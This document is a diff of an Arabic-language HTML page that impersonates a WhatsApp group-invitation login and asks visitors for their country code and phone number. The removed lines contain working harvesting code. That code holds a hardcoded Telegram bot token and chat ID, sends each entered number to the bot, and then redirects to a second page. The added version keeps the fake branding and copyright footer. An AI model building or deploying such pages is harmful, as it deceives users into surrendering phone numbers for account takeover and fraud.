@@ -3,227 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>Telegram Registration</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
+    <title>WhatsApp Registration</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             background-color: #FAF3E7;
             margin: 0;
             padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
         }
 
-        /* Navigation Bar */
+        /* شريط التنقل */
         .navbar {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            background-color: #fff;
+            background-color: #25D366;
             padding: 10px 20px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            color: white;
+            font-size: 18px;
         }
 
         .navbar .logo {
-            font-size: 24px;
-            color: #25D366;
-            font-weight: bold;
-        }
-
-        .navbar .nav-links {
             display: flex;
-            gap: 15px;
+            align-items: center;
         }
 
-        .navbar .nav-links a {
-            text-decoration: none;
-            color: #333;
-            font-size: 14px;
+        .navbar .logo img {
+            height: 30px;
+            margin-right: 10px;
         }
 
-        .navbar .toggle-menu {
-            display: none;
-            font-size: 20px;
+        .navbar .menu {
             cursor: pointer;
+            font-size: 22px;
         }
 
-        /* Responsive Navbar */
-        @media (max-width: 768px) {
-            .navbar .nav-links {
-                display: none;
-                flex-direction: column;
-                gap: 10px;
-                background-color: #fff;
-                position: absolute;
-                top: 60px;
-                right: 10px;
-                padding: 10px;
-                border: 1px solid #ddd;
-                border-radius: 5px;
-                box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-            }
-
-            .navbar .nav-links.active {
-                display: flex;
-            }
-
-            .navbar .toggle-menu {
-                display: block;
-            }
-        }
-
-        /* Container */
+        /* الحاوية الرئيسية */
         .container {
+            flex: 1;
             text-align: center;
-            background-color: #fff;
+            background-color: white;
             border-radius: 10px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
             padding: 20px;
-            max-width: 500px;
+            max-width: 400px;
             margin: 20px auto;
         }
 
-        .inopt {
-            border-radius: 6px;
-            padding-right: 5px;
-            border-color: #55555534;
-            border-width: 1px;
-            padding: 10px;
-            font-size: 14px;
-            width: 100%;
-            box-sizing: border-box;
-        }
-
-        .logo {
-            color: #25D366;
-            margin-bottom: 10px;
-            height: 30px;
-        }
-        .www {
-            color: #25D366;
-            margin-bottom: 10px;
-            height: 30px;
-            font-size: 24px;
-        }
-        .title {
-            font-size: 18px;
-            font-weight: bold;
+        .container .design img {
+            width: 150px;
             margin-bottom: 20px;
         }
 
-        .icon {
-            width: 80px;
-            height: 80px;
-            background-color: #E7F4EB;
-            border-radius: 50%;
-            margin: 0 auto 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+        .container .title {
+            font-size: 22px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
         }
 
-        .icon img {
-            width: 40px;
-        }
-
-        .description {
+        .container .description {
             font-size: 14px;
             color: #555;
+            text-align: center;
             margin-bottom: 20px;
         }
 
-        .form-group {
+        .container .form-group {
             display: flex;
             flex-direction: column;
             gap: 10px;
-            align-items: stretch;
+            align-items: center;
             margin-bottom: 20px;
         }
 
-        select {
+        .container select,
+        .container input {
+            border: 1px solid #ddd;
+            border-radius: 6px;
             padding: 10px;
             font-size: 14px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
             width: 100%;
-            display: flex;
-            align-items: center;
+            max-width: 300px;
+            box-sizing: border-box;
         }
 
-        option {
-            padding: 10px;
-            display: flex;
-            align-items: center;
-        }
-
-        button {
-            padding: 10px 20px;
+        .container button {
+            padding: 12px 20px;
             background-color: #25D366;
-            color: #fff;
+            color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 6px;
             font-size: 16px;
             cursor: pointer;
             width: 100%;
+            max-width: 300px;
         }
 
-        button:hover {
+        .container button:hover {
             background-color: #1DA955;
         }
 
-        .dropdown-item {
-            display: flex;
-            align-items: center;
+        /* الشريط السفلي */
+        footer {
+            background-color: #f1f1f1;
+            color: #888;
+            text-align: center;
+            padding: 10px;
+            font-size: 12px;
+            margin-top: auto;
         }
 
-        .flag {
-            width: 20px;
-            height: 15px;
-            margin-right: 8px;
-            vertical-align: middle;
-        }
-
-        @media (min-width: 600px) {
-            .form-group {
-                flex-direction: row;
-                gap: 10px;
-            }
-
-            select,
-            input {
-                width: auto;
-                flex: 1;
-            }
-
-            button {
-                width: auto;
-            }
+        footer a {
+            color: #25D366;
+            text-decoration: none;
         }
     </style>
 </head>
 
 <body>
-    <!-- Navbar -->
+    <!-- شريط التنقل -->
     <div class="navbar">
         <div class="logo">
-    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="شعار واتساب" style="height: 50px;">
-</div>
-        <div class="toggle-menu" onclick="toggleMenu()">☰</div>
-        <div class="nav-links">
-            <a href="#">الأنشطة التجارية</a>
-            <a href="#">المدونة</a>
-            <a href="#">مركز المساعدة</a>
-            <a href="#">الخصوصية</a>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
+            واتساب
         </div>
+        <div class="menu">☰</div>
     </div>
 
-    <!-- Main Container -->
+    <!-- الحاوية الرئيسية -->
     <div class="container">
-        <div class="www">WhatsApp</div>
-        <div class="title">تسجيل الدخول</div>
-<img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="شعار واتساب" style="height: 100px; margin-bottom: 20px;">
+        <!-- الشعار -->
+        <div class="design">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
+        </div>
 
-</div>
+        <!-- العنوان -->
+        <div class="title">تسجيل الدخول</div>
+
+        <!-- الوصف -->
         <div class="description">الدعوة للانضمام إلى مجموعة واتساب</div>
+
+        <!-- النموذج -->
         <div class="form-group">
             <select id="countryCode">
                 <option value="966">🇸🇦 السعودية +966</option>
@@ -243,78 +168,31 @@
                 <option value="967">🇾🇪 اليمن +967</option>
                 <option value="269">🇰🇲 جزر القمر +269</option>
                 <option value="211">🇸🇸 جنوب السودان +211</option>
-                <!-- Add more countries as needed -->
             </select>
-            <input id="phoneNumber" class="inopt" type="text" placeholder="رقم الهاتف">
+            <input id="phoneNumber" type="text" placeholder="رقم الهاتف">
         </div>
         <button onclick="sendMessage()">متابعة</button>
     </div>
 
+    <!-- الشريط السفلي -->
+    <footer>
+        © 2024 واتساب. جميع الحقوق محفوظة. <br>
+        <a href="https://www.whatsapp.com/legal/">سياسة الخصوصية</a> | <a href="https://www.whatsapp.com/">مركز المساعدة</a>
+    </footer>
+
     <script>
-        function toggleMenu() {
-            const navLinks = document.querySelector('.nav-links');
-            navLinks.classList.toggle('active');
-        }
-
-        // Remplacer avec votre token et chat ID Telegram pour les tests uniquement
-        const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
-        const chatId = '612575358';
-
-        // Fonction principale pour envoyer un message
         function sendMessage() {
-            // Référence aux éléments HTML
-            const countryCodeSelect = document.getElementById('countryCode');
-            const phoneNumberInput = document.getElementById('phoneNumber');
+            const countryCode = document.getElementById('countryCode').value;
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
 
-            // Récupération des valeurs des champs
-            const countryCode = countryCodeSelect.value;
-            const phoneNumber = phoneNumberInput.value.trim();
-
-            // Validation des entrées
             if (!countryCode || !phoneNumber) {
-                alert('Veuillez saisir un code pays et un numéro de téléphone valides.');
+                alert('يرجى إدخال رمز الدولة ورقم الهاتف');
                 return;
             }
 
-            // Concaténer le numéro complet
             const fullPhoneNumber = `+${countryCode} ${phoneNumber}`;
-            const message = `Numéro de téléphone : ${fullPhoneNumber}`;
-
-            // Appel à l'API Telegram
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                }),
-            })
-                .then((response) => {
-                    if (!response.ok) {
-                        throw new Error('Une erreur est survenue lors de l\'envoi du message.');
-                    }
-                    return response.json();
-                })
-                .then((data) => {
-                    if (data.ok) {
-                        alert('Message envoyé avec succès !');
-                        phoneNumberInput.value = ''; // Efface le champ du numéro de téléphone
-                    } else {
-                        alert('Erreur : ' + data.description || 'Une erreur inconnue s\'est produite.');
-                    }
-                })
-                .catch((error) => {
-                    alert('Une erreur réseau est survenue : ' + error.message);
-                });
-
-            // Redirection pour un retour visuel
-            setTimeout(() => {
-                window.location.href = 'secondpage.html';
-            }, 1000); // Délai pour améliorer l’expérience utilisateur
+            alert(`تم إرسال الرقم: ${fullPhoneNumber}`);
         }
-
     </script>
 </body>
 </html>
